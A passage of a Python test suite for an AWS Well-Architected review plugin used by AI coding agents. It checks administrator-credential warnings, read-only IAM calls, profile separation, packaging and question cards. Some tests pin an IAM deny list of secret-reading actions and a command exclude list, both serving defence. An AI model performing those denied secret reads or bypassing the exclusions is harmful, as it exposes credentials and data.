        self.assertFalse(f({"Statement": [{"Effect": "Allow", "Action": "*", "Resource": "arn:aws:s3:::b/*"}]}))
        self.assertFalse(f("not json"))
        self.assertFalse(f(None))

    def test_a_read_only_role_gets_a_clean_but_modest_report(self):
        table = {**self.role(), **self.attached("arn:aws:iam::aws:policy/ReadOnlyAccess", "arn:aws:iam::aws:policy/SecurityAudit")}
        with self.sess(table):
            code, out, err = run(["auth-check"], self.d)
        self.assertEqual(code, 0, err)
        self.assertIn("admin check: no AdministratorAccess", out)
        self.assertIn("not proof", out)                      # it does not claim the role is read-only
        self.assertNotIn("warning", err)

    def test_an_attached_administrator_policy_warns_but_does_not_stop(self):
        table = {**self.role("Ops"), **self.attached("arn:aws:iam::aws:policy/AdministratorAccess")}
        with self.sess(table):
            code, out, err = run(["auth-check"], self.d)
        self.assertEqual(code, 0)                            # a hint, not a block
        self.assertIn("warning: these credentials look like an administrator", err)
        self.assertIn("AdministratorAccess attached", err)
        self.assertIn("Stop and confirm with the user", err)
        self.assertNotIn("admin check: no", out)             # it must not also say it found nothing
        # the scan warns the same way and still runs
        with self.sess(table):
            code, out, err = run(["scan-aws", "--regions", "ap-northeast-1"], self.d)
        self.assertEqual(code, 0, err)
        self.assertIn("AdministratorAccess attached", err)
        self.assertIn("AWS scan done", out)

    def test_power_user_access_is_flagged_as_broad_write(self):
        table = {**self.role("Dev"), **self.attached("arn:aws:iam::aws:policy/PowerUserAccess")}
        with self.sess(table):
            _, _, err = run(["auth-check"], self.d)
        self.assertIn("PowerUserAccess attached", err)

    def test_the_sso_administrator_role_name_is_a_hint_even_when_iam_cannot_be_read(self):
        table = {**self.role("AWSReservedSSO_AdministratorAccess_0123abcd"),
                 ("iam", "list_attached_role_policies"): Fake("AccessDenied", "not allowed")}
        with self.sess(table):
            code, _, err = run(["auth-check"], self.d)
        self.assertEqual(code, 0)
        self.assertIn("suggests an administrator", err)

    def test_when_iam_cannot_be_read_it_says_the_check_was_skipped(self):
        table = {**self.role("Scan"), ("iam", "list_attached_role_policies"): Fake("AccessDenied", "not allowed")}
        with self.sess(table):
            code, out, err = run(["auth-check"], self.d)
        self.assertEqual(code, 0)
        self.assertIn("admin check: skipped (IAM could not be read", out)
        self.assertNotIn("warning", err)
        self.assertNotIn("admin check: no", out)

    def test_another_failure_is_reported_as_skipped_not_raised(self):
        table = {**self.role("Scan"), ("iam", "list_attached_role_policies"): Fake("Throttling", "slow down")}
        with self.sess(table):
            code, out, _ = run(["auth-check"], self.d)
        self.assertEqual(code, 0)
        self.assertIn("skipped (the attached policies could not be checked (Throttling))", out)

    def test_a_customer_managed_policy_that_allows_everything_is_found(self):
        arn = f"arn:aws:iam::{self.ACCT}:policy/Everything"
        doc = {"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}
        table = {**self.role("Ops"), **self.attached(arn),
                 ("iam", "get_policy"): {"Policy": {"DefaultVersionId": "v2"}},
                 ("iam", "get_policy_version"): {"PolicyVersion": {"Document": doc}}}
        with self.sess(table):
            _, _, err = run(["auth-check"], self.d)
        self.assertIn("'Everything', which allows every action on every resource", err)
        doc["Statement"][0]["Condition"] = {"StringEquals": {"aws:RequestedRegion": "ap-northeast-1"}}   # a condition: not an unconditional admin
        with self.sess(table):
            _, out, err = run(["auth-check"], self.d)
        self.assertNotIn("warning", err)

    def test_an_inline_policy_that_allows_everything_is_found(self):
        doc = {"Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]}
        table = {**self.role("Ops"), **self.attached(),
                 ("iam", "list_role_policies"): {"PolicyNames": ["inline-all"]},
                 ("iam", "get_role_policy"): {"PolicyDocument": doc}}
        with self.sess(table):
            _, _, err = run(["auth-check"], self.d)
        self.assertIn("inline policy 'inline-all'", err)

    def test_a_user_gets_its_groups_checked_too(self):
        table = {STS: {"Account": self.ACCT, "Arn": f"arn:aws:iam::{self.ACCT}:user/alice"},
                 ("iam", "list_groups_for_user"): {"Groups": [{"GroupName": "admins"}]},
                 ("iam", "list_attached_user_policies"): {"AttachedPolicies": []},
                 ("iam", "list_user_policies"): {"PolicyNames": []},
                 ("iam", "list_attached_group_policies"): {"AttachedPolicies": [{"PolicyName": "AdministratorAccess", "PolicyArn": kensa_scan.ADMIN_POLICY_ARN}]},
                 ("iam", "list_group_policies"): {"PolicyNames": []}}
        with self.sess(table):
            code, _, err = run(["auth-check"], self.d)
        self.assertEqual(code, 0)
        self.assertIn("group 'admins' has AdministratorAccess attached", err)

    def test_the_check_only_calls_iam_reads(self):
        calls = []

        def rec(op, value):
            return lambda **kw: calls.append(op) or value
        arn = f"arn:aws:iam::{self.ACCT}:policy/Mine"
        table = {**self.role("Ops"),
                 ("iam", "list_attached_role_policies"): rec("list_attached_role_policies", {"AttachedPolicies": [{"PolicyName": "Mine", "PolicyArn": arn}]}),
                 ("iam", "list_role_policies"): rec("list_role_policies", {"PolicyNames": ["p"]}),
                 ("iam", "get_policy"): rec("get_policy", {"Policy": {"DefaultVersionId": "v1"}}),
                 ("iam", "get_policy_version"): rec("get_policy_version", {"PolicyVersion": {"Document": {"Statement": []}}}),
                 ("iam", "get_role_policy"): rec("get_role_policy", {"PolicyDocument": {"Statement": []}})}
        with self.sess(table):
            code, _, _ = run(["auth-check"], self.d)
        self.assertEqual(code, 0)
        self.assertTrue(calls)
        self.assertTrue(all(c.startswith(("list_", "get_")) for c in calls), calls)
        self.assertTrue(all(kensa_scan.ReadOnlyClient.allowed(c) for c in calls), calls)

    def test_the_number_of_policy_documents_read_is_capped(self):
        many = [f"arn:aws:iam::{self.ACCT}:policy/P{i}" for i in range(40)]
        n = []
        table = {**self.role("Ops"), **self.attached(*many),
                 ("iam", "get_policy"): lambda **kw: n.append(1) or {"Policy": {"DefaultVersionId": "v1"}},
                 ("iam", "get_policy_version"): {"PolicyVersion": {"Document": {"Statement": []}}}}
        with self.sess(table):
            code, _, _ = run(["auth-check"], self.d)
        self.assertEqual(code, 0)
        self.assertEqual(len(n), kensa_scan._POLICY_DOC_LIMIT)

    def test_root_credentials_allowed_explicitly_are_not_checked_for_admin(self):
        root = {STS: {"Account": self.ACCT, "Arn": f"arn:aws:iam::{self.ACCT}:root"}}
        with self.sess(root):
            code, out, _ = run(["auth-check", "--allow-root"], self.d)
        self.assertEqual(code, 0)
        self.assertIn("admin check: skipped (this kind of principal is not checked)", out)

    def test_docs_and_skill_tell_the_agent_what_to_do_with_the_warning(self):
        skill = read_text(os.path.join(ROOT, "skills", "kensa-review", "SKILL.md"))
        self.assertIn("look like an administrator", skill)
        self.assertIn("stop and tell the user", skill)
        self.assertIn("not proof of read-only", skill)
        for rel, phrase in (("docs/aws-iam.md", "admin check"), ("docs/ja/aws-iam.md", "管理者チェック")):
            self.assertIn(phrase, read_text(os.path.join(ROOT, rel)), rel)


class ProfileSplit(Seeded):
    """Separate the profile that reads AWS (aws.profile) from the one that touches the W-A Tool (aws.wa_profile)."""

    def setUp(self):
        super().setUp()
        p = mock.patch.object(kensa_wa, "client", side_effect=AssertionError("the test tried to create a real AWS client"))
        p.start()
        self.addCleanup(p.stop)

    def used(self, argv, table=None, stop=True):
        """Run argv and return the profile passed to make_session. With stop, record it and then stop with an auth error
        (so nothing proceeds to further AWS calls)."""
        seen = []

        def make(profile=None, region=None):
            seen.append(profile)
            if stop:
                raise kensa_scan.AuthError("stop")
            return FakeSession(table or STS_OK)
        with mock.patch.object(kensa_scan, "make_session", make):
            code, out, err = run(argv, self.d)
        return seen, code, out, err

    def setup_profiles(self, scan="kensa-scan", wa="kensa-wa"):
        if scan:
            run(["context", "set", f"aws.profile={scan}"], self.d)
        if wa:
            run(["context", "set", f"aws.wa_profile={wa}"], self.d)

    def test_scan_uses_the_scan_profile_and_wa_commands_use_the_wa_profile(self):
        self.setup_profiles()
        self.assertEqual(self.used(["scan-aws", "--regions", "ap-northeast-1"])[0], ["kensa-scan"])
        self.assertEqual(self.used(["auth-check"])[0], ["kensa-scan"])
        self.assertEqual(self.used(["auth-check", "--for", "wa"])[0], ["kensa-wa"])
        self.assertEqual(self.used(["precheck", "--workload-id", "w-1"])[0], ["kensa-wa"])
        self.assertEqual(self.used(["seed", "--from-wa-tool", "--workload-id", "w-1"])[0], ["kensa-wa"])
        run(["finalize", "--allow-empty"], self.d)
        self.assertEqual(self.used(["push", "--workload-id", "w-1", "--apply"])[0], ["kensa-wa"])
        self.assertEqual(self.used(["workload-create", "--name", "kensa-test", "--owner", "Taro Yamada taro@example.com", "--apply"])[0][:1], ["kensa-wa"])

    def test_without_wa_profile_the_scan_profile_is_used_as_before(self):
        self.setup_profiles(wa=None)
        self.assertEqual(self.used(["auth-check", "--for", "wa"])[0], ["kensa-scan"])

    def test_explicit_profile_wins_over_the_context(self):
        self.setup_profiles()
        self.assertEqual(self.used(["auth-check", "--for", "wa", "--profile", "other"])[0], ["other"])
        self.assertEqual(self.used(["scan-aws", "--regions", "ap-northeast-1", "--profile", "other"])[0], ["other"])

    def test_wa_connection_is_labelled_and_not_matched_against_the_scanned_accounts(self):
        # A W-A Tool workload can live in a different account from the scanned ones (e.g. an aggregation account for reviews)
        self.setup_profiles()
        run(["context", "set", 'aws.account_ids=["999999999999"]'], self.d)
        _, code, out, _ = self.used(["auth-check", "--for", "wa"], stop=False)
        self.assertEqual(code, 0)
        self.assertIn("[for W-A Tool]", out)
        self.assertIn("123456789012", out)
        _, code, _, err = self.used(["auth-check"], stop=False)   # the scan side is checked against account_ids
        self.assertEqual(code, 3)
        self.assertIn("999999999999", err)

    def test_auth_failure_for_the_wa_profile_names_that_profile(self):
        self.setup_profiles()
        _, code, _, err = self.used(["auth-check", "--for", "wa"], {STS: named_exc("UnauthorizedSSOTokenError")}, stop=False)
        self.assertEqual(code, 3)
        self.assertIn("aws sso login --profile kensa-wa", err)

    def test_context_template_has_the_key(self):
        self.assertIn("wa_profile", kensa.CONTEXT_TEMPLATE["aws"])


class CloudFormationTemplate(unittest.TestCase):
    """The contents of iam/scan-role.yaml must not drift from the code's blocks and allows (iam-policy). cfn-lint is run separately by hand."""
    PATH = os.path.join(ROOT, "iam", "scan-role.yaml")

    @staticmethod
    def generated(text, kind):
        import re
        m = re.search(r"# BEGIN generated by: kensa\.py iam-policy --kind %s\b.*\n((?:\s*- [A-Za-z0-9:*-]+\n)+)\s*# END generated" % re.escape(kind), text)
        assert m, f"block for {kind} not found"
        return sorted(line.strip()[2:] for line in m.group(1).splitlines())

    @staticmethod
    def actions(doc):
        out = []
        for st in doc["Statement"]:
            out += st["Action"] if isinstance(st["Action"], list) else [st["Action"]]
        return sorted(out)

    def setUp(self):
        self.text = read_text(self.PATH)

    def test_embedded_actions_equal_iam_policy_output(self):
        hint = "update the template to match the output of `kensa.py iam-policy --kind …`"
        self.assertEqual(self.generated(self.text, "scan-deny"), self.actions(kensa_scan.scan_deny_policy()), hint)
        self.assertEqual(self.generated(self.text, "wa-tool-write"), self.actions(kensa_wa.wa_policy(write=True)), hint)

    def test_scan_role_is_read_only_and_never_holds_wa_tool_write(self):
        head, _, wa_role = self.text.partition("\n  WaToolRole:\n")
        self.assertTrue(wa_role, "WaToolRole is missing")
        wa_role = wa_role.partition("\nOutputs:\n")[0]
        scan_role = head.partition("\nResources:\n")[2]
        self.assertIn("policy/ReadOnlyAccess", scan_role)
        self.assertIn("policy/SecurityAudit", scan_role)
        self.assertIn("Effect: Deny", scan_role)
        self.assertNotIn("wellarchitected:", scan_role)   # the scan role has no W-A Tool permissions
        self.assertNotIn("ReadOnlyAccess", wa_role)   # the W-A Tool role cannot read anything else
        self.assertIn("Condition: WithWaToolRole", wa_role)
        self.assertIn('Default: "false"', self.text.partition("CreateWaToolRole:")[2].partition("Conditions:")[0])   # the write role is created only when asked for

    def test_trust_is_never_open_to_the_whole_account_by_default(self):
        # The trust target is the account root, narrowed by an aws:PrincipalArn condition. The pattern is required (no default)
        self.assertEqual(self.text.count("aws:PrincipalArn: !"), 2)   # the condition key (mentions in descriptions are not counted)
        block = self.text.partition("TrustedPrincipalArnPattern:\n")[2].partition("  TrustedAccountId:")[0]
        self.assertNotIn("Default:", block)
        self.assertIn("AllowedPattern: '^arn:aws:(iam|sts)::[0-9]{12}:.+$'", block)


class UvScriptMetadata(unittest.TestCase):
    """The PEP 723 header that `uv run kensa.py` uses. Pinned so dependencies and the Python version do not drift from the README."""

    def test_inline_metadata_declares_dependencies_and_python(self):
        import re
        src = read_text(os.path.join(SCRIPTS, "kensa.py"))
        m = re.search(r"^# /// script\n((?:#.*\n)+?)# ///$", src, re.M)
        self.assertIsNotNone(m, "no PEP 723 script block")
        block = m.group(1)
        self.assertIn('requires-python = ">=3.11"', block)
        self.assertIn('"boto3>=', block)   # a lower bound is set (no upper bound)
        self.assertIn('"openpyxl>=', block)
        self.assertTrue(src.startswith("#!/usr/bin/env python3\n# /// script\n"))   # right after the shebang (PEP 723 allows it anywhere in the file, but the position is pinned)


class IamPolicies(unittest.TestCase):
    def policy(self, kind):
        with tempfile.TemporaryDirectory() as d:
            code, out, err = run(["iam-policy", "--kind", kind], os.path.join(d, ".kensa"))
        self.assertEqual(code, 0, err)
        return json.loads(out)

    def test_deny_table_is_tied_to_the_scanner_guard(self):
        self.assertTrue(kensa_scan.DENY_ACTIONS)
        for op, actions in kensa_scan.DENY_ACTIONS.items():
            self.assertFalse(kensa_scan.ReadOnlyClient.allowed(op), f"{op} is not blocked by ReadOnlyClient")
            for act in actions:
                self.assertRegex(act, r"^[a-z0-9-]+:[A-Za-z*]+$")

    def test_scan_deny_policy_only_denies_and_covers_the_blocked_reads(self):
        doc = self.policy("scan-deny")
        self.assertEqual(doc["Version"], "2012-10-17")
        self.assertEqual([s["Effect"] for s in doc["Statement"]], ["Deny"])
        acts = doc["Statement"][0]["Action"]
        self.assertEqual(acts, sorted(set(acts)))
        for must in ("secretsmanager:GetSecretValue", "ssm:GetParameter", "ssm:GetParametersByPath", "s3:GetObject", "ec2:GetPasswordData",
                     "lambda:GetFunctionConfiguration", "dynamodb:Scan", "kms:Decrypt",
                     "secretsmanager:BatchGetSecretValue", "logs:GetLogEvents", "logs:FilterLogEvents", "logs:StartQuery",
                     "logs:GetQueryResults", "athena:GetQueryResults", "cloudformation:GetTemplate", "codecommit:GetBlob",
                     "ec2:GetConsoleOutput", "dynamodb:GetItem", "kinesis:GetRecords",
                     "codecommit:GetFile", "codecommit:GitPull", "codebuild:BatchGetBuilds", "states:GetExecutionHistory",
                     "logs:GetLogRecord"):
            self.assertIn(must, acts)
        for acts_ in kensa_scan.DENY_ACTIONS.values():
            self.assertTrue(set(acts_) <= set(acts))

    def test_wa_tool_policy_matches_the_api_calls_in_the_code(self):
        import inspect
        import re
        used = set(re.findall(r"[^a-z_]c\.([a-z_]+)\(", inspect.getsource(kensa_wa)))
        camel = {"".join(p.capitalize() for p in m.split("_")) for m in used}
        self.assertEqual(camel, set(kensa_wa.IAM_READ) | set(kensa_wa.IAM_WRITE))
        read, write = self.policy("wa-tool-read"), self.policy("wa-tool-write")
        r_acts, w_acts = set(read["Statement"][0]["Action"]), set(write["Statement"][0]["Action"])
        self.assertEqual({a.split(":")[1] for a in r_acts}, set(kensa_wa.IAM_READ))
        self.assertEqual({a.split(":")[1] for a in w_acts}, camel)
        self.assertNotIn("wellarchitected:UpdateAnswer", r_acts)
        self.assertIn("wellarchitected:CreateMilestone", w_acts)
        self.assertEqual({s["Effect"] for s in read["Statement"] + write["Statement"]}, {"Allow"})


class Packaging(unittest.TestCase):
    def test_manifests_agree_and_reference_existing_files(self):
        cc = read_json(os.path.join(ROOT, ".claude-plugin", "plugin.json"))
        ap = read_json(os.path.join(ROOT, "plugin.json"))
        mk = read_json(os.path.join(ROOT, ".claude-plugin", "marketplace.json"))
        versions = {cc["version"], ap["version"], mk["metadata"]["version"], mk["plugins"][0]["version"]}
        self.assertEqual(len(versions), 1, versions)
        self.assertNotIn("mcpServers", cc)   # Claude Code finds the bundled .mcp.json by itself (a key here would replace it); see test_bundled_mcp_is_docs_only_and_credential_free
        self.assertTrue(os.path.isdir(os.path.join(ROOT, cc["skills"])))
        self.assertEqual(cc["keywords"], ap["keywords"])
        self.assertEqual({cc["license"], ap["license"]}, {"Apache-2.0"})
        self.assertEqual(cc["homepage"], ap["homepage"])
        self.assertEqual(cc["repository"], ap["repository"])
        self.assertEqual(ap["repository"], "https://github.com/Anti-Pattern-Inc/Kensa")
        self.assertTrue(os.path.isfile(os.path.join(ROOT, "LICENSE")))
        opt = read_json(os.path.join(ROOT, "optional", "aws-mcp.json"))
        self.assertIn("aws-mcp", opt["mcpServers"])

    def test_bundled_mcp_is_docs_only_and_credential_free(self):
        # The MCP installed by default is only a credential-free remote connection. It has no credentials, profile or process launch
        cc = read_json(os.path.join(ROOT, ".mcp.json"))
        ap = read_json(os.path.join(ROOT, "mcp.json"))
        self.assertEqual(ap["$schema"], "https://agent-plugins.org/schemas/1.0.0/mcp.schema.json")
        self.assertEqual(set(cc), {"mcpServers"})
        self.assertEqual(set(ap), {"$schema", "mcpServers"})
        self.assertEqual(set(cc["mcpServers"]), {"aws-docs"})
        self.assertEqual(set(ap["mcpServers"]), {"aws-docs"})
        c, a = cc["mcpServers"]["aws-docs"], ap["mcpServers"]["aws-docs"]
        self.assertEqual(c, {"type": "http", "url": c["url"]})   # the Claude Code type
        self.assertEqual(a, {"type": "streamable-http", "url": a["url"]})   # the type in the Agent Plugins schema
        self.assertEqual(c["url"], a["url"])
        self.assertTrue(c["url"].startswith("https://aws-mcp.") and c["url"].endswith("/mcp"), c["url"])
        # Server names do not overlap with the optional IAM-authenticated configuration, and nothing else is bundled under optional/ that would clash
        self.assertNotIn("aws-docs", read_json(os.path.join(ROOT, "optional", "aws-mcp.json"))["mcpServers"])
        self.assertFalse(os.path.exists(os.path.join(ROOT, "optional", "aws-docs.json")))   # it is bundled, so no opt-in copy is kept

    def test_docs_say_the_docs_mcp_is_bundled_and_the_iam_one_is_optional(self):
        # The wording that was "opt-in" until 2026-11-03 must not survive in the docs
        for rel in ("README.md", "README.ja.md", "docs/aws-mcp.md", "docs/ja/aws-mcp.md", "docs/limitations.md", "docs/ja/limitations.md",
                    "skills/kensa-review/SKILL.md", "skills/kensa-review/references/phase-0-1-context-lens.md"):
            text = read_text(os.path.join(ROOT, rel))
            self.assertNotIn("optional/aws-docs.json", text, rel)
            self.assertNotIn("claude mcp add --transport http aws-docs", text, rel)
            self.assertNotIn("No MCP server is enabled by default", text, rel)
            self.assertNotIn("既定で有効になる MCP サーバーはありません", text, rel)
        # SKILL.md keeps the agent from following the server's own "prefer MCP over Bash" instruction
        skill = read_text(os.path.join(ROOT, "skills", "kensa-review", "SKILL.md"))
        self.assertIn("ignore that here", skill)
        self.assertIn("scan-aws", skill)

    def test_skills_follow_the_agent_skills_layout(self):
        # What readers of Agent Skills (Kiro Power, `gh skill install`, ...) expect: skills/<name>/SKILL.md, name equal to the directory name,
        # name in lowercase letters, digits and hyphens up to 64 characters, description up to 1024 characters, a license. Parts a skill needs to work alone live inside each skill
        import re
        base = os.path.join(ROOT, "skills")
        names = sorted(d for d in os.listdir(base) if os.path.isdir(os.path.join(base, d)))
        self.assertEqual(names, ["kensa-demo", "kensa-partner-record", "kensa-resume", "kensa-review"])
        for n in names:
            text = read_text(os.path.join(base, n, "SKILL.md"))
            m = re.match(r"---\n(.*?)\n---\n", text, re.S)
            self.assertIsNotNone(m, n)
            fm = dict(re.findall(r"^([a-z-]+): (.*)$", m.group(1), re.M))
            self.assertEqual(fm["name"], n)
            self.assertRegex(fm["name"], r"^[a-z0-9]+(-[a-z0-9]+)*$")
            self.assertLessEqual(len(fm["name"]), 64)
            self.assertTrue(fm["description"])
            self.assertLessEqual(len(fm["description"]), 1024, n)
            self.assertEqual(fm["license"], "Apache-2.0", n)
            self.assertLessEqual(len(fm.get("compatibility", "")), 500, n)
        self.assertTrue(os.path.isfile(os.path.join(base, "kensa-review", "scripts", "kensa.py")))
        self.assertTrue(os.path.isfile(os.path.join(base, "kensa-review", "assets", "cards.json")))

    def test_every_claude_code_command_has_a_skill_for_other_agents(self):
        # F3: Kiro reads skills/ but not commands/, so /kensa:demo, /kensa:resume and /kensa:record need a skill of their own (start = kensa-review)
        cmds = sorted(f[:-3] for f in os.listdir(os.path.join(ROOT, "commands")) if f.endswith(".md"))
        self.assertEqual(cmds, ["demo", "record", "resume", "start"])
        skill_for = {"demo": "kensa-demo", "record": "kensa-partner-record", "resume": "kensa-resume", "start": "kensa-review"}
        for c in cmds:
            self.assertTrue(os.path.isfile(os.path.join(ROOT, "skills", skill_for[c], "SKILL.md")), c)

    def test_skills_forbid_wrapping_the_cli_in_a_shell_function(self):
        # F6: Kiro asked for approval on every call because `W` was defined as a shell function or variable (and zsh did not split the variable)
        for n in ("kensa-review", "kensa-partner-record", "kensa-demo", "kensa-resume"):
            text = read_text(os.path.join(ROOT, "skills", n, "SKILL.md"))
            self.assertIn("Never define `W`", text, n)
            self.assertIn("one command per call", text, n)

    def test_kiro_permissions_match_the_claude_code_allowlist_and_never_allow_aws(self):
        # F6: the Kiro sample allows exactly the local-only subcommands that docs/getting-started.md allows for Claude Code
        import re
        text = read_text(os.path.join(ROOT, "optional", "kiro-permissions.yaml"))
        body = text.partition("rules:")[2]
        allow = re.findall(r'^      - "(uv run [^"]+)"$', body.partition("exclude:")[0], re.M)
        excl = re.findall(r'^      - "([^"]+)"$', body.partition("exclude:")[2], re.M)
        guide = read_text(os.path.join(ROOT, "docs", "getting-started.md"))
        cc = re.findall(r'"Bash\(uv run \*kensa\.py ([^)]+)\)"', guide)
        self.assertTrue(allow)
        # the same subcommands as Claude Code; Kiro's patterns also allow global options (`--dir X`) before the subcommand
        subs = [a.replace("uv run *kensa.py*", "", 1).rstrip("*").strip() for a in allow]
        self.assertEqual(sorted(set(subs) - {"init"}), sorted(c.rstrip("*").strip() for c in cc))
        # those wide patterns are safe only because every AWS-touching subcommand or flag is excluded
        for bad in ("scan-aws", "push", "precheck", "workload-create", "from-wa-tool", "--apply", "auth-check", "export", "scan-repo"):
            self.assertIn(f"*kensa.py*{bad}*", excl, bad)
            self.assertFalse([m for m in allow if bad in m], bad)
        self.assertIn("effect: allow", body)
        self.assertNotRegex(body, r'"uv run \*"')

    def test_kiro_permission_patterns_match_what_they_should(self):
        # Kiro: `*` matches any sequence of characters; a command is allowed when it matches an allow pattern and no exclude
        import fnmatch
        import re
        body = read_text(os.path.join(ROOT, "optional", "kiro-permissions.yaml")).partition("\nrules:\n")[2]
        allow = re.findall(r'^      - "([^"]+)"$', body.partition("exclude:")[0], re.M)
        excl = re.findall(r'^      - "([^"]+)"$', body.partition("exclude:")[2], re.M)
        ok = lambda cmd: any(fnmatch.fnmatchcase(cmd, p) for p in allow) and not any(fnmatch.fnmatchcase(cmd, p) for p in excl)
        k = "uv run /home/u/.kiro/skills/kensa-review/scripts/kensa.py"
        for cmd in ("init --demo", "--dir .kensa-demo init --demo", "--dir .kensa-demo cards next -n 2 --pillar security", "plan",
                    "--lang ja status", "cards answer C-OPS-OWNERSHIP --current partial --choose recommend", "seed --from-csv a.csv"):
            self.assertTrue(ok(f"{k} {cmd}"), cmd)
        for cmd in ("scan-aws", "--dir .kensa-demo push --workload-id x", "push --workload-id x --apply", "auth-check",
                    "seed --from-wa-tool --workload-id x", "workload-create --name n --apply", "precheck --workload-id x",
                    "export --format csv --out x.csv", "scan-repo --gh", "--dir d cards next scan-aws"):
            self.assertFalse(ok(f"{k} {cmd}"), cmd)

    def test_activation_keywords_are_specific(self):
        # Kiro activates a Power when the conversation touches a keyword. Do not include words that would activate it in every AWS conversation
        ap = read_json(os.path.join(ROOT, "plugin.json"))
        self.assertTrue(ap["keywords"])
        for generic in ("aws", "review", "security", "reliability", "cloud"):
            self.assertNotIn(generic, ap["keywords"])
        self.assertIn("well-architected", ap["keywords"])

    def test_optional_mcp_config_pins_the_cli_distribution(self):
        # The proxy's README recommends mcp-proxy-for-aws-cli with pinned dependencies for uvx
        opt = read_json(os.path.join(ROOT, "optional", "aws-mcp.json"))
        args = opt["mcpServers"]["aws-mcp"]["args"]
        self.assertTrue(args[0].startswith("mcp-proxy-for-aws-cli@"), args)
        self.assertNotEqual(args[0], "mcp-proxy-for-aws-cli@latest", args)
        self.assertTrue(any(a.startswith("https://aws-mcp.") and a.endswith("/mcp") for a in args), args)

    def test_agent_plugins_manifests_follow_the_1_0_0_schema(self):
        # Pin offline the required and allowed fields of the schema at https://agent-plugins.org/schemas/1.0.0/ (fetched and verified on 2026-11-01)
        ap = read_json(os.path.join(ROOT, "plugin.json"))
        self.assertEqual(ap["$schema"], "https://agent-plugins.org/schemas/1.0.0/plugin.schema.json")
        self.assertLessEqual(set(ap), {"$schema", "name", "version", "description", "author", "homepage", "repository",
                                       "license", "keywords", "extensions"})
        self.assertRegex(ap["name"], r"^(?!.*(?:--|\.\.))[a-z0-9](?:[a-z0-9.-]*[a-z0-9])?$")
        self.assertLessEqual(len(ap["name"]), 64)
        self.assertLessEqual(set(ap["author"]), {"name", "email", "url"})
        opt = read_json(os.path.join(ROOT, "optional", "aws-mcp.json"))
        self.assertEqual(opt["$schema"], "https://agent-plugins.org/schemas/1.0.0/mcp.schema.json")
        self.assertEqual(set(opt), {"$schema", "mcpServers"})
        for name, s in opt["mcpServers"].items():
            self.assertEqual(s.get("type"), "stdio", name)   # stdio servers must have a type (the schema's required)
            self.assertTrue(s.get("command"), name)
            self.assertLessEqual(set(s), {"type", "command", "args", "env", "cwd"}, name)
            self.assertTrue(all(isinstance(a, str) for a in s.get("args", [])), name)

    def test_docs_name_the_current_mcp_tools(self):
        # The official current tool list has no aws___call_aws. Pin that the docs do not go back to recommending the legacy tool name
        rels = ("docs/aws-mcp.md", "skills/kensa-review/SKILL.md", "skills/kensa-review/references/aws-readonly-checks.md")
        phase_refs = tuple(f"skills/kensa-review/references/{n}" for n in sorted(os.listdir(os.path.join(ROOT, "skills", "kensa-review", "references")))
                           if n.startswith("phase-"))
        for rel in rels + phase_refs:
            with open(os.path.join(ROOT, rel), encoding="utf-8") as f:
                lines = f.read().splitlines()
            for ln in lines:
                if "aws___call_aws" in ln:
                    self.assertIn("legacy tool", ln, (rel, ln))
        for rel in rels:
            with open(os.path.join(ROOT, rel), encoding="utf-8") as f:
                self.assertIn("aws___run_script", f.read(), rel)

    def test_skill_md_stays_slim_and_points_only_to_files_that_exist(self):
        # SKILL.md is loaded in full every time the skill runs: keep it to the safety rules and the flow, with the per-phase detail in references/
        base = os.path.join(ROOT, "skills", "kensa-review")
        text = read_text(os.path.join(base, "SKILL.md"))
        self.assertLessEqual(len(text.encode("utf-8")), 20000)
        paths = set(re.findall(r"`((?:references|assets|scripts)/[A-Za-z0-9_.-]+)`", text))
        self.assertTrue(any(p.startswith("references/phase-") for p in paths))
        for rel in paths:
            self.assertTrue(os.path.isfile(os.path.join(base, rel)), rel)
        for n in os.listdir(os.path.join(base, "references")):
            if n.startswith("phase-"):
                self.assertIn(f"references/{n}", text, n)      # every phase file is announced in SKILL.md
        for ln in text.splitlines():
            self.assertLessEqual(len(ln), 1200, ln[:60])        # no 1500-character bullets

    def test_commands_are_flat_markdown_entry_points(self):
        # Claude Code finds commands/*.md next to skills/ without a manifest entry (a "commands" key would replace the default scan, so do not add one)
        d = os.path.join(ROOT, "commands")
        names = sorted(n[:-3] for n in os.listdir(d) if n.endswith(".md"))
        self.assertEqual(names, ["demo", "record", "resume", "start"])
        for n in names:
            text = read_text(os.path.join(d, n + ".md"))
            m = re.match(r"---\n(.*?)\n---\n", text, re.S)
            self.assertIsNotNone(m, n)
            fm = dict(re.findall(r"^([a-z-]+): (.*)$", m.group(1), re.M))
            self.assertTrue(fm.get("description"), n)
            self.assertIn("kensa-", text, n)                    # each command hands over to one of the two skills
        self.assertNotIn("commands", read_json(os.path.join(ROOT, ".claude-plugin", "plugin.json")))


class PlainLanguageQuestions(Seeded):
    def test_plain_questions_are_shown_first_with_the_technical_wording_attached(self):
        # the exact wording is asserted on the Japanese cards (cards.ja.json); for en only the structure is
        out = run(["cards", "show", "C-REL-RTO-RPO"], self.d, lang="ja")[1]
        i_plain, i_tech = out.index("Question: "), out.index("(technical wording)")
        self.assertLess(i_plain, i_tech)
        self.assertIn("何時間", out[i_plain:i_tech])
        self.assertIn("RTO", out[i_tech:])
        for lang in ("en", "ja"):
            out = run(["cards", "show", "C-REL-RTO-RPO"], self.d, lang=lang)[1]
            self.assertLess(out.index("Question: "), out.index("(technical wording)"), lang)
            plain = json.loads(run(["cards", "show", "C-REL-RTO-RPO", "--json"], self.d, lang=lang)[1])
            self.assertTrue(plain["ask_plain"] and plain["ask"], lang)

    def test_cards_without_ask_plain_are_unchanged_and_bundle_is_consistent(self):
        for lang in ("en", "ja"):
            out = run(["cards", "show", "C-SEC-THREAT"], self.d, lang=lang)[1]
            self.assertNotIn("technical wording", out, lang)
        for fn in ("cards.json", "cards.ja.json"):
            cards = read_json(os.path.join(ASSETS, fn))["cards"]
            withp = [c["id"] for c in cards if "ask_plain" in c]
            self.assertEqual(sorted(withp), ["C-OPS-ORR", "C-REL-RTO-RPO", "C-REL-SLO", "C-REL-TESTING", "C-SEC-FORENSIC"], fn)
            for c in cards:
                if "ask_plain" in c:
                    self.assertTrue(c["ask_plain"].strip() and c["ask"].strip(), fn)

    @needs_openpyxl
    def test_questions_sheet_carries_both_wordings(self):
        run(["finalize", "--allow-empty"], self.d)
        from openpyxl import load_workbook
        for lang, marker in (("ja", "専門用語:"), ("en", "Technical wording:")):
            x = os.path.join(self.tmp.name, f"o-{lang}.xlsx")
            run(["export", "--out", x], self.d, lang=lang)
